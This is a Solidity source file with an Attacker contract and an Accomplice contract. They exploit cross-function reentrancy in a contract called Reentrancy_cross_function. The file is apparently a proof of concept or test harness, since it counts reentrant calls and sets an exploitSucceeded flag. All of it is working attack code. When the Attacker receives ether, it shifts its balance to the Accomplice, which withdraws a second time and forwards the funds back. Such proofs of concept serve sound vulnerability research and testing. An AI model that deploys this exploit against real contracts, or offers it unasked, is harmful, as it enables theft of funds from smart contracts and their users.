contract Attacker {
    Reentrancy_cross_function public _victim;
    
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    
    uint256 public storedAttackVal;
    address public accomplice;

    constructor(address victimAddress) { 
        _victim = Reentrancy_cross_function(victimAddress);
        accomplice = address(new Accomplice(victimAddress, address(this)));
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        
        // Call the vulnerable withdrawBalance function
        _victim.withdrawBalance();

        // Set exploitSucceeded based on the success condition
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    function incrementReentrancyCount() external {
        reentrancyCount++;
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Cross-function reentrancy: transfer balance to accomplice, then accomplice withdraws
            _victim.transfer(accomplice, storedAttackVal);
            Accomplice(payable(accomplice)).withdraw();
        }
    }
}

contract Accomplice {
    Reentrancy_cross_function public _victim;
    Attacker public _attacker;

    constructor(address victimAddress, address attackerAddress) {
        _victim = Reentrancy_cross_function(victimAddress);
        _attacker = Attacker(payable(attackerAddress));
    }

    function withdraw() external {
        _victim.withdrawBalance();
    }

    receive() external payable {
        _attacker.incrementReentrancyCount();
        // Forward funds to attacker
        (bool success, ) = address(_attacker).call{value: msg.value}("");
        require(success);
    }
}
